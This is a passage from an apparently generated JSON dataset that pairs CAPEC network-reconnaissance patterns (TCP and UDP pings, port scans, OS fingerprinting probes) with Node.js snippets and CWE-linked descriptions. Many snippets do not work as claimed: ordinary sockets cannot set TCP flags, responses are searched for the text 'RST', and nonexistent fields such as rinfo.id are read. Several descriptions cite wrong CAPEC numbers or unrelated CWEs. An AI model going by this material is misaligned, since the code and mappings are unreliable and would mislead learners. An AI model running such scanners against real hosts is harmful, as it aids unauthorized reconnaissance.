        "description": "This JavaScript code snippet demonstrates a TCP ACK Ping to determine if a remote host is alive. The code uses the 'net' module to create a TCP socket and connect to a specified host and port. It sends a TCP segment with the ACK flag set. If the host is alive, it will respond with a RST packet, which the code checks for in the response data. If a RST packet is detected, it logs that the host is alive. This code snippet embodies the main idea of CAPEC-292 (TCP ACK Ping) and touches on CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially exposing the host's status. It also indirectly relates to CWE-319 (Cleartext Transmission of Sensitive Information) as the communication is not encrypted, making it susceptible to sniffing."
    },
    {
        "capec_id": "298",
        "capec_name": "UDP Ping",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from('');\nconst targetHost = '192.168.1.1';\nconst targetPort = 65535;\n\nclient.send(message, 0, message.length, targetPort, targetHost, (err) => {\n  if (err) {\n    console.error('Error sending UDP packet:', err);\n  } else {\n    console.log('UDP packet sent to ' + targetHost + ':' + targetPort);\n  }\n  client.close();\n});\n\nclient.on('message', (msg, rinfo) => {\n  console.log(`Received message: ${msg} from ${rinfo.address}:${rinfo.port}`);\n});",
        "description": "This JavaScript code snippet uses the 'dgram' module to create a UDP client that sends an empty UDP datagram to a high port (65535) on a target host (192.168.1.1). The goal is to solicit an 'ICMP port unreachable' message, indicating that the host is alive. This embodies the main idea of the CAPEC 'UDP Ping'. The code also listens for any incoming messages, which could be used to detect the 'ICMP port unreachable' response. This example highlights potential vulnerabilities such as exposure of sensitive information (CWE-200), incorrectly specified destination (CWE-941), and improper protection for outbound error messages (CWE-1320)."
    },
    {
        "capec_id": "299",
        "capec_name": "TCP SYN Ping",
        "code_snippet": "const net = require('net');\n\nfunction sendSYNPing(target, port) {\n  const client = new net.Socket();\n  client.connect(port, target, () => {\n    console.log('SYN packet sent');\n  });\n\n  client.on('data', (data) => {\n    if (data.toString().includes('SYN/ACK')) {\n      console.log('Port is open');\n    } else if (data.toString().includes('RST')) {\n      console.log('Port is closed');\n    }\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.log('Error:', err.message);\n    client.destroy();\n  });\n}\n\nsendSYNPing('192.168.1.1', 80);",
        "description": "This JavaScript code snippet uses the 'net' module to create a TCP client that sends a SYN packet to a specified target and port. The code attempts to connect to the target, and based on the response (SYN/ACK or RST), it determines whether the port is open or closed. This embodies the main idea of the CAPEC 'TCP SYN Ping' by using TCP SYN packets for host discovery. The code also touches on CWE-200 (Exposure of Sensitive Information) as it reveals the status of the port, and CWE-319 (Cleartext Transmission of Sensitive Information) since the communication is not encrypted."
    },
    {
        "capec_id": "300",
        "capec_name": "Port Scanning",
        "code_snippet": "const net = require('net');\nconst sensitiveData = 'password123';\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    console.log('Received:', data.toString());\n    // Echo the data back to the client\n    socket.write(sensitiveData);\n  });\n});\n\nserver.listen(8080, '0.0.0.0', () => {\n  console.log('Server listening on port 8080');\n});\n\n// Simulate multiple binds to the same port\nconst anotherServer = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    console.log('Another server received:', data.toString());\n  });\n});\n\nanotherServer.listen(8080, '0.0.0.0', () => {\n  console.log('Another server also listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates a TCP server using the 'net' module that listens on port 8080. When data is received, it logs the data and sends back sensitive information ('password123') in cleartext, demonstrating CWE-319 (Cleartext Transmission of Sensitive Information). Additionally, it attempts to bind another server to the same port (8080), illustrating CWE-605 (Multiple Binds to the Same Port). This setup can be exploited by an adversary to perform port scanning and potentially intercept sensitive information, aligning with the CAPEC description of determining the state of ports and exploiting services running on them."
    },
    {
        "capec_id": "301",
        "capec_name": "TCP Connect Scan",
        "code_snippet": "const net = require('net');\n\nconst targetIP = '192.168.1.1';\nconst targetPort = 80;\n\nconst client = new net.Socket();\nclient.connect(targetPort, targetIP, () => {\n  console.log('Connected to ' + targetIP + ':' + targetPort);\n  client.end();\n});\n\nclient.on('error', (err) => {\n  console.log('Port ' + targetPort + ' is closed or unreachable.');\n});",
        "description": "This JavaScript code snippet demonstrates a basic TCP connect scan using Node.js. The code attempts to establish a TCP connection to a specified IP address and port. If the connection is successful, it logs a message indicating that the port is open. If the connection fails, it logs that the port is closed or unreachable. This embodies the main idea of the CAPEC 'TCP Connect Scan' by using a full TCP connection attempt to determine the status of a port. The code also indirectly touches on related CWEs: it could expose sensitive information (CWE-200) if the target system logs connection attempts, and it relies on IP address for identifying the target (CWE-291)."
    },
    {
        "capec_id": "302",
        "capec_name": "TCP FIN Scan",
        "code_snippet": "const net = require('net');\n\nfunction tcpFinScan(target, port) {\n  const client = new net.Socket();\n  client.connect(port, target, () => {\n    console.log(`Connected to ${target}:${port}`);\n    client.end();\n  });\n\n  client.on('close', () => {\n    console.log('Connection closed');\n    // Send a TCP packet with the FIN flag set\n    const finPacket = Buffer.from([0x01]); // Simplified representation\n    client.write(finPacket);\n  });\n\n  client.on('data', (data) => {\n    if (data.includes('RST')) {\n      console.log(`Port ${port} is closed`);\n    } else {\n      console.log(`Port ${port} is open or filtered`);\n    }\n  });\n\n  client.on('error', (err) => {\n    console.error(`Error: ${err.message}`);\n  });\n}\n\ntcpFinScan('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a simplified TCP FIN scan to determine if a port on a target machine is closed. The code uses the 'net' module to create a TCP connection to the target. Once connected, it sends a TCP packet with the FIN flag set. If the target responds with a RST packet, it indicates that the port is closed. This behavior is based on the CAPEC description of using out-of-state TCP flags to identify closed ports. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200), not verifying data integrity (CWE-353), and not ensuring proper communication endpoints (CWE-923)."
    },
    {
        "capec_id": "303",
        "capec_name": "TCP Xmas Scan",
        "code_snippet": "const net = require('net');\n\nfunction sendXmasScan(target, port) {\n  const client = new net.Socket();\n  client.connect(port, target, () => {\n    const xmasPacket = Buffer.from([0xFF, 0xFF, 0xFF, 0xFF]); // All flags set\n    client.write(xmasPacket);\n  });\n\n  client.on('data', (data) => {\n    if (data.includes('RST')) {\n      console.log(`Port ${port} is closed on ${target}`);\n    } else {\n      console.log(`Port ${port} is open or filtered on ${target}`);\n    }\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error(`Error: ${err.message}`);\n    client.destroy();\n  });\n}\n\nsendXmasScan('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a TCP Xmas scan, which is used to determine if ports are closed on a target machine. The code uses the 'net' module to create a TCP connection to a specified target and port. It then sends a TCP packet with all flags set (Xmas packet). If the target port is closed, the server responds with a RST packet, which the client detects and logs that the port is closed. If no RST packet is received, it logs that the port is open or filtered. This scan technique leverages the behavior described in RFC 793 and is related to several CWEs, such as exposure of sensitive information (CWE-200) and improper restriction of communication channels (CWE-923)."
    },
    {
        "capec_id": "304",
        "capec_name": "TCP Null Scan",
        "code_snippet": "const net = require('net');\n\nfunction tcpNullScan(target, port) {\n  const client = new net.Socket();\n\n  client.connect(port, target, () => {\n    const nullPacket = Buffer.alloc(0); // Create an empty buffer to simulate a TCP NULL packet\n    client.write(nullPacket);\n  });\n\n  client.on('data', (data) => {\n    console.log(`Received data: ${data.toString()}`);\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    if (err.code === 'ECONNRESET') {\n      console.log(`Port ${port} is closed on ${target}`);\n    } else {\n      console.error(`Error: ${err.message}`);\n    }\n    client.destroy();\n  });\n}\n\ntcpNullScan('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a TCP NULL scan to identify closed ports on a target machine. The `tcpNullScan` function attempts to connect to a specified port on a target IP address and sends an empty buffer to simulate a TCP packet with no flags set. If the port is closed, the target machine responds with a TCP RST packet, which triggers an 'ECONNRESET' error. The code listens for this error to determine if the port is closed. This scan technique leverages the behavior described in RFC 793, where out-of-state TCP segments sent to closed ports elicit a RST response. The code also highlights potential vulnerabilities such as exposure of sensitive information (CWE-200), missing integrity checks (CWE-353), and cleartext transmission (CWE-319)."
    },
    {
        "capec_id": "305",
        "capec_name": "TCP ACK Scan",
        "code_snippet": "const net = require('net');\n\nfunction tcpAckScan(target, port) {\n  const client = new net.Socket();\n  client.connect(port, target, () => {\n    const ackPacket = Buffer.from('4500003c1c4640004006b1e6c0a80001c0a80002', 'hex');\n    client.write(ackPacket);\n  });\n\n  client.on('data', (data) => {\n    console.log('Received:', data.toString('hex'));\n    client.destroy();\n  });\n\n  client.on('close', () => {\n    console.log('Connection closed');\n  });\n}\n\ntcpAckScan('192.168.0.1', 80);",
        "description": "This JavaScript code snippet demonstrates a basic TCP ACK scan using Node.js. The `tcpAckScan` function attempts to connect to a specified target and port, then sends a crafted TCP ACK packet. The response is logged to the console, which can be used to infer firewall or ACL configurations. This code embodies the main idea of CAPEC-303 (TCP ACK Scan) by attempting to gather information about firewall rules. The code also touches on related CWEs, such as CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-319 (Cleartext Transmission of Sensitive Information), by potentially exposing sensitive network configuration details through cleartext communication."
    },
    {
        "capec_id": "306",
        "capec_name": "TCP Window Scan",
        "code_snippet": "const net = require('net');\n\nfunction tcpWindowScan(target, port) {\n  const client = new net.Socket();\n  client.connect(port, target, () => {\n    client.write('GET / HTTP/1.1\\r\\nHost: ' + target + '\\r\\n\\r\\n');\n  });\n\n  client.on('data', (data) => {\n    const windowSize = data.readUInt16BE(14); // Extract TCP Window Size from the packet\n    console.log(`Window Size: ${windowSize}`);\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error(`Error: ${err.message}`);\n  });\n}\n\ntcpWindowScan('example.com', 80);",
        "description": "This JavaScript code snippet demonstrates a simplified version of a TCP Window Scan. It connects to a specified target and port, sends a basic HTTP request, and then reads the TCP Window Size from the response packet. The window size is logged to the console, which can be used to infer information about the target system. This code embodies the main idea of the CAPEC by performing a TCP Window Scan to gather information about the target system. The related CWEs are represented by the potential exposure of sensitive information (CWE-200, CWE-497), the cleartext transmission of data (CWE-319), and the lack of integrity checks (CWE-353)."
    },
    {
        "capec_id": "307",
        "capec_name": "TCP RPC Scan",
        "code_snippet": "const net = require('net');\nconst rpcPort = 111; // Common RPC port\nconst sensitiveData = 'Sensitive Information';\n\nconst client = new net.Socket();\nclient.connect(rpcPort, 'target-host', () => {\n  console.log('Connected to RPC service');\n  client.write('RPC request');\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  if (data.includes(sensitiveData)) {\n    console.log('Sensitive data exposed: ' + data);\n  }\n  client.destroy();\n});\n\nclient.on('error', (err) => {\n  console.error('Connection error: ' + err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a TCP RPC scan on a Unix/Linux host. It attempts to connect to a common RPC port (111) on a target host and sends an RPC request. If the response contains sensitive information, it logs that the sensitive data has been exposed. This embodies the main idea of the CAPEC by scanning for RPC services and potentially exposing sensitive information (CWE-200). The code also hints at the possibility of other related weaknesses, such as authentication bypass (CWE-294) if the RPC service is not properly secured, and the risk of multiple binds to the same port (CWE-605) if the service allows it."
    },
    {
        "capec_id": "308",
        "capec_name": "UDP Scan",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  console.log(`Server got: ${msg} from ${rinfo.address}:${rinfo.port}`);\n  // Exposing sensitive information\n  const response = `Received your message: ${msg}`;\n  server.send(response, rinfo.port, rinfo.address, (err) => {\n    if (err) console.error('Error sending response:', err);\n  });\n});\n\nserver.on('error', (err) => {\n  console.error(`Server error:\n${err.stack}`);\n  server.close();\n});\n\nserver.bind(41234); // Multiple binds to the same port\n\nconsole.log('UDP server listening on port 41234');",
        "description": "This JavaScript code snippet creates a simple UDP server using the 'dgram' module. The server listens for incoming UDP datagrams on port 41234. When a message is received, it logs the message and sender's information, then sends a response back to the sender. This code embodies the main idea of a UDP scan (CAPEC-303) by demonstrating how an adversary might interact with a UDP service to gather information. The code also highlights several related CWEs: it exposes sensitive information (CWE-200) by logging and responding with the received message, allows multiple binds to the same port (CWE-605), and transmits data in cleartext (CWE-319)."
    },
    {
        "capec_id": "309",
        "capec_name": "Network Topology Mapping",
        "code_snippet": "const http = require('http');\nconst os = require('os');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/network-info') {\n    const networkInterfaces = os.networkInterfaces();\n    res.writeHead(200, {'Content-Type': 'application/json'});\n    res.end(JSON.stringify(networkInterfaces));\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code creates a simple HTTP server using Node.js. When a request is made to the '/network-info' endpoint, the server responds with detailed network interface information of the host machine. This information includes IP addresses, MAC addresses, and other network-related details. The code embodies the concept of 'Network Topology Mapping' (CAPEC) by exposing sensitive network information that could be used by an adversary to map the network. The related CWEs are represented as follows: CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) are demonstrated by the server exposing network details to any requester. CWE-1125 (Excessive Attack Surface) is illustrated by the server unnecessarily exposing sensitive endpoints. This code snippet highlights the risks associated with improper handling and exposure of sensitive network information."
    },
    {
        "capec_id": "310",
        "capec_name": "Scanning for Vulnerable Software",
        "code_snippet": "const net = require('net');\nconst sensitiveData = 'username=admin&password=admin123'; // CWE-319: Cleartext Transmission of Sensitive Information\n\nconst client = new net.Socket();\nclient.connect(21, '192.168.1.1', () => { // Connecting to an FTP service on port 21\n  console.log('Connected to server');\n  client.write(sensitiveData); // CWE-319: Sending sensitive data in cleartext\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  client.destroy(); // Close the connection\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});\n\nclient.on('error', (err) => {\n  console.error('Connection error: ' + err.message); // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n});",
        "description": "This JavaScript code snippet demonstrates a simple network client that connects to an FTP service on port 21 of a target server (192.168.1.1). The code sends sensitive information (username and password) in cleartext, which embodies CWE-319 (Cleartext Transmission of Sensitive Information). The connection error handling exposes potential sensitive information about the connection error, representing CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor). This snippet illustrates the main idea of CAPEC-300, where an attacker scans for vulnerable software (in this case, an FTP service) and exploits it by transmitting sensitive data insecurely."
    },
    {
        "capec_id": "311",
        "capec_name": "DEPRECATED: OS Fingerprinting",
        "code_snippet": "const http = require('http');\nconst os = require('os');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/os-info') {\n    // Vulnerable to information exposure\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`OS Type: ${os.type()}\nOS Platform: ${os.platform()}\nOS Release: ${os.release()}`);\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code creates an HTTP server that listens on port 8080. When a request is made to the '/os-info' endpoint, it responds with detailed information about the operating system, such as OS type, platform, and release. This represents a form of OS fingerprinting (CAPEC-312: Active OS Fingerprinting) by exposing sensitive OS information. The code is vulnerable to CWE-532 (Information Exposure Through Debug Log Files) as it exposes internal system details that could be used by an attacker to identify the OS and potentially exploit OS-specific vulnerabilities. Additionally, it does not implement proper access control (CWE-287) to restrict access to this sensitive information."
    },
    {
        "capec_id": "312",
        "capec_name": "Active OS Fingerprinting",
        "code_snippet": "const net = require('net');\n\nconst targetIP = '192.168.1.1';\nconst targetPort = 80;\n\nconst probePacket = Buffer.from('4500003c1c4640004006b1e6c0a80001c0a80002', 'hex');\n\nconst client = new net.Socket();\nclient.connect(targetPort, targetIP, () => {\n  client.write(probePacket);\n});\n\nclient.on('data', (data) => {\n  console.log('Received:', data.toString('hex'));\n  client.destroy();\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});\n\nclient.on('error', (err) => {\n  console.error('Error:', err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a basic example of active OS fingerprinting. It uses the 'net' module to create a TCP client that connects to a target IP and port. The client sends a crafted probe packet designed to elicit a response that can reveal information about the target's operating system. The response is then logged in hexadecimal format. This approach leverages the differences in how various operating systems handle and respond to specific network packets, which can be used to identify the OS version. The code also highlights potential vulnerabilities such as exposure of sensitive information (CWE-200, CWE-497) and observable discrepancies (CWE-207) that can be exploited by an attacker."
    },
    {
        "capec_id": "313",
        "capec_name": "Passive OS Fingerprinting",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  // Log request headers to passively fingerprint OS\n  console.log('Request Headers:', req.headers);\n\n  // Simulate sensitive information exposure\n  if (req.url === '/sensitive') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Sensitive Information: OS Version 1.0.0');\n  } else {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Hello World');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It logs the request headers, which can be used for passive OS fingerprinting by analyzing the headers to infer the operating system. Additionally, it simulates the exposure of sensitive information by serving a specific URL ('/sensitive') that returns sensitive data in cleartext. This demonstrates vulnerabilities such as CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-319 (Cleartext Transmission of Sensitive Information). The code embodies the main idea of CAPEC- Passive OS Fingerprinting by passively monitoring communication to detect OS information."
    },
    {
        "capec_id": "314",
        "capec_name": "DEPRECATED: IP Fingerprinting Probes",
        "code_snippet": "const http = require('http');\nconst dns = require('dns');\n\nhttp.createServer((req, res) => {\n  const clientIP = req.connection.remoteAddress;\n  dns.reverse(clientIP, (err, hostnames) => {\n    if (err) {\n      res.writeHead(500, {'Content-Type': 'text/plain'});\n      res.end('Internal Server Error');\n      return;\n    }\n    if (hostnames.includes('trusted.domain.com')) {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Access Granted');\n    } else {\n      res.writeHead(403, {'Content-Type': 'text/plain'});\n      res.end('Access Denied');\n    }\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that performs a DNS reverse lookup on the client's IP address to make an access control decision. If the client's IP address resolves to 'trusted.domain.com', access is granted; otherwise, access is denied. This code embodies the deprecated CAPEC-312 (Active OS Fingerprinting) by attempting to identify the client's operating system or trusted status through DNS lookups, which is a flawed security practice. It also touches on CWE-247 (Reliance on DNS Lookups in a Security Decision) by demonstrating the vulnerability of making security decisions based on DNS information, which can be unreliable and spoofed."
    },
    {
        "capec_id": "315",
        "capec_name": "DEPRECATED: TCP/IP Fingerprinting Probes",
        "code_snippet": "const net = require('net');\nconst crypto = require('crypto');\n\nconst client = new net.Socket();\nconst serverAddress = '192.168.1.1';\nconst serverPort = 8080;\n\nclient.connect(serverPort, serverAddress, () => {\n  console.log('Connected to server');\n  const message = 'AUTH user:password';\n  const hash = crypto.createHash('md5').update(message).digest('hex');\n  client.write(hash);\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  client.destroy();\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a TCP client that connects to a server and sends an MD5 hashed authentication message. The code embodies the main idea of CAPEC-312 (Active OS Fingerprinting) by establishing a TCP connection and sending data that could be used for fingerprinting the OS. Additionally, it incorporates CWE-294 (Authentication Bypass by Capture-replay) by using a simple hash for authentication, which could be captured and replayed by an attacker. The use of MD5, a weak hashing algorithm, further exacerbates the vulnerability. The code also touches on CWE-589 (Call to Non-ubiquitous API) by using the 'net' module, which may not be available in all JavaScript environments, potentially leading to inconsistencies."
    },
    {
        "capec_id": "316",
        "capec_name": "DEPRECATED: ICMP Fingerprinting Probes",
        "code_snippet": "const http = require('http');\nconst dns = require('dns');\n\nhttp.createServer((req, res) => {\n  const hostname = req.headers['host'];\n  dns.lookup(hostname, (err, address) => {\n    if (err) {\n      res.writeHead(500, {'Content-Type': 'text/plain'});\n      res.end('Internal Server Error');\n      return;\n    }\n    if (address === '192.168.1.1') { // Example of a trusted IP\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Access Granted');\n    } else {\n      res.writeHead(403, {'Content-Type': 'text/plain'});\n      res.end('Access Denied');\n    }\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that makes a security decision based on the result of a DNS lookup, which is a deprecated practice (CWE-247). The server checks the hostname from the request headers and performs a DNS lookup to get the corresponding IP address. If the IP address matches a trusted IP (e.g., '192.168.1.1'), access is granted; otherwise, access is denied. This approach is vulnerable because DNS lookups can be spoofed, leading to potential security bypasses. The code represents the deprecated CAPEC pattern of relying on DNS lookups for security decisions."
    },
    {
        "capec_id": "317",
        "capec_name": "IP ID Sequencing Probe",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst targetHost = '192.168.1.1';\nconst targetPort = 12345;\n\nlet previousId = null;\n\nfunction sendProbe() {\n  const message = Buffer.from('Hello');\n  client.send(message, 0, message.length, targetPort, targetHost, (err) => {\n    if (err) throw err;\n    console.log('Probe sent');\n  });\n}\n\nclient.on('message', (msg, rinfo) => {\n  const ipId = rinfo.id; // Simulated extraction of IP ID from response\n  if (previousId !== null) {\n    console.log(`Previous IP ID: ${previousId}, Current IP ID: ${ipId}`);\n    // Analyze the sequence of IP IDs\n  }\n  previousId = ipId;\n  sendProbe();\n});\n\nsendProbe();",
        "description": "This JavaScript code snippet demonstrates a basic implementation of an IP ID sequencing probe using UDP packets. The code sends a probe message to a target host and port, then listens for responses. Upon receiving a response, it extracts the IP ID (simulated here as `rinfo.id`), compares it with the previous IP ID, and sends another probe. This process helps analyze the IP ID sequence generation algorithm of the target host, which can be used for OS fingerprinting. The code embodies the main idea of the CAPEC by illustrating how an attacker might probe and analyze IP ID sequences. The related CWEs provide context on potential vulnerabilities, such as exposure of sensitive information (CWE-200) and reliance on IP addresses for authentication (CWE-291)."
    },
    {
        "capec_id": "318",
        "capec_name": "IP 'ID' Echoed Byte-Order Probe",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from('Hello');\nconst ipID = 12345; // Arbitrary IP ID value\n\nclient.on('message', (msg, rinfo) => {\n  const echoedIPID = msg.readUInt16BE(4); // Read the echoed IP ID from the ICMP error message\n  if (echoedIPID === ipID) {\n    console.log('IP ID echoed back correctly');\n  } else {\n    console.log('IP ID not echoed back correctly');\n  }\n  client.close();\n});\n\nclient.send(message, 0, message.length, 12345, 'target.host', (err) => {\n  if (err) throw err;\n  console.log('UDP message sent');\n});",
        "description": "This JavaScript code snippet demonstrates a simplified version of the 'IP 'ID' Echoed Byte-Order Probe' attack. It sends a UDP datagram with an arbitrary IP 'ID' value to a closed port on a remote host. The code listens for an ICMP error message in response and checks if the IP 'ID' value is echoed back correctly. This can help an attacker determine the operating system or router firmware based on how the IP 'ID' is handled. The code also touches on CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially exposing the IP 'ID' handling behavior, which is sensitive information. The other CWEs related to improper identifier management and decoding are indirectly relevant as they highlight the importance of correctly handling and protecting identifiers in network communications."
    },
    {
        "capec_id": "319",
        "capec_name": "IP (DF) 'Don't Fragment Bit' Echoing Probe",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from('');\nconst options = {\n  address: '192.168.1.1', // Target IP address\n  port: 12345, // Closed port\n  df: true // Set the 'Don't Fragment' bit\n};\n\nclient.send(message, 0, message.length, options.port, options.address, (err) => {\n  if (err) throw err;\n  console.log('UDP message sent with DF bit set');\n  client.close();\n});\n\nclient.on('message', (msg, rinfo) => {\n  const dfBitSet = (msg.readUInt8(6) & 0x40) !== 0;\n  console.log(`Received response from ${rinfo.address}:${rinfo.port} with DF bit ${dfBitSet ? 'set' : 'not set'}`);\n});",
        "description": "This JavaScript code snippet demonstrates a UDP client that sends a datagram to a specified IP address and port with the 'Don't Fragment' (DF) bit set. The client then listens for a response to check if the DF bit is echoed back by the remote host. This behavior can be used for OS fingerprinting, as different operating systems handle the DF bit differently in their responses. The code also touches on CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially revealing the OS type, and CWE-941 (Incorrectly Specified Destination in a Communication Channel) by sending packets to a potentially unintended or unauthorized destination."
    },
    {
        "capec_id": "320",
        "capec_name": "TCP Timestamp Probe",
        "code_snippet": "const net = require('net');\n\nconst options = {\n  port: 80,\n  host: 'target.server.com'\n};\n\nconst client = net.createConnection(options, () => {\n  console.log('Connected to server');\n  client.write('GET / HTTP/1.1\\r\\nHost: target.server.com\\r\\n\\r\\n');\n});\n\nclient.on('data', (data) => {\n  const timestampRegex = /TSval=(\\d+)/;\n  const match = data.toString().match(timestampRegex);\n  if (match) {\n    console.log(`TCP Timestamp: ${match[1]}`);\n  }\n  client.end();\n});\n\nclient.on('end', () => {\n  console.log('Disconnected from server');\n});",
        "description": "This JavaScript code snippet demonstrates a TCP timestamp probe, which is used for OS fingerprinting by examining the TCP timestamps in the response from a target server. The code establishes a TCP connection to a specified server and sends an HTTP GET request. Upon receiving the response, it extracts the TCP timestamp from the TCP options field using a regular expression. This timestamp can then be analyzed to infer the operating system of the target server. The code embodies the main idea of CAPEC-Name: 'TCP Timestamp Probe' and highlights CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by exposing the TCP timestamp, which can be considered sensitive information. Additionally, it touches on CWE-319 (Cleartext Transmission of Sensitive Information) as the HTTP request and response are transmitted in cleartext."
    },
    {
        "capec_id": "321",
        "capec_name": "TCP Sequence Number Probe",
        "code_snippet": "const net = require('net');\n\nfunction generateSequenceNumber(ackNumber) {\n  // Predictable sequence number generation (CWE-337)\n  return ackNumber + 1; // Vulnerable pattern\n}\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    const ackNumber = parseInt(data.toString(), 10);\n    const sequenceNumber = generateSequenceNumber(ackNumber);\n    console.log(`Generated Sequence Number: ${sequenceNumber}`);\n    // Cleartext transmission of sequence number (CWE-319)\n    socket.write(`Sequence Number: ${sequenceNumber}`);\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates a TCP server that listens on port 8080. When it receives data, it interprets the data as an acknowledgment number, generates a sequence number by adding one to the acknowledgment number (a predictable pattern, CWE-337), and then sends the sequence number back to the client in cleartext (CWE-319). This demonstrates the concept of TCP Sequence Number Probe (CAPEC) by showing how an attacker could predict the sequence number based on the acknowledgment number, which can be used for OS fingerprinting or other malicious activities."
    },
    {
        "capec_id": "322",
        "capec_name": "TCP (ISN) Greatest Common Divisor Probe",
        "code_snippet": "const net = require('net');\n\nfunction sendSynPacket(targetHost, targetPort) {\n  const client = new net.Socket();\n  client.connect(targetPort, targetHost, () => {\n    console.log('Connected to target');\n    client.write('SYN'); // Simulate sending a SYN packet\n  });\n\n  client.on('data', (data) => {\n    console.log('Received:', data.toString());\n    analyzeISN(data.toString());\n    client.destroy(); // Close the connection\n  });\n\n  client.on('close', () => {\n    console.log('Connection closed');\n  });\n}\n\nfunction analyzeISN(response) {\n  // Extract and analyze the ISN from the SYN/ACK response\n  const isn = extractISN(response);\n  console.log('Extracted ISN:', isn);\n  // Compare against known OS behaviors (mocked for this example)\n  const osType = identifyOSType(isn);\n  console.log('Identified OS Type:', osType);\n}\n\nfunction extractISN(response) {\n  // Mock function to extract ISN from response\n  return response.split(' ')[1]; // Simplified extraction\n}\n\nfunction identifyOSType(isn) {\n  // Mock function to identify OS type based on ISN\n  const osDatabase = {\n    '12345': 'Linux',\n    '67890': 'Windows'\n  };\n  return osDatabase[isn] || 'Unknown';\n}\n\nsendSynPacket('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a simplified version of the 'TCP (ISN) Greatest Common Divisor Probe' attack. It sends a TCP SYN packet to a target host and port, receives the SYN/ACK response, and extracts the Initial Sequence Number (ISN) from the response. The extracted ISN is then analyzed to identify the operating system type by comparing it against a mock database of known OS behaviors. This code embodies the main idea of the CAPEC by illustrating how an attacker can use ISN analysis for OS fingerprinting. The related CWEs are represented by the potential exposure of sensitive system information (ISN) to an unauthorized actor, which can be used to infer the OS type and version."
    },
    {
        "capec_id": "323",
        "capec_name": "TCP (ISN) Counter Rate Probe",
        "code_snippet": "const net = require('net');\n\nfunction measureISNRate(host, port, duration) {\n  let startTime = Date.now();\n  let isnIncrements = [];\n  let lastISN = null;\n\n  const client = new net.Socket();\n  client.connect(port, host, () => {\n    console.log('Connected');\n  });\n\n  client.on('data', (data) => {\n    let isn = parseISN(data);\n    if (lastISN !== null) {\n      isnIncrements.push(isn - lastISN);\n    }\n    lastISN = isn;\n    if (Date.now() - startTime > duration) {\n      client.destroy();\n      analyzeISNRate(isnIncrements);\n    }\n  });\n\n  client.on('close', () => {\n    console.log('Connection closed');\n  });\n}\n\nfunction parseISN(data) {\n  // Dummy function to parse ISN from TCP packet data\n  return data.readUInt32BE(0);\n}\n\nfunction analyzeISNRate(increments) {\n  let totalIncrements = increments.reduce((a, b) => a + b, 0);\n  let averageRate = totalIncrements / increments.length;\n  console.log('Average ISN increment rate:', averageRate);\n  // Compare averageRate with known OS database to infer OS\n}\n\nmeasureISNRate('example.com', 80, 10000);",
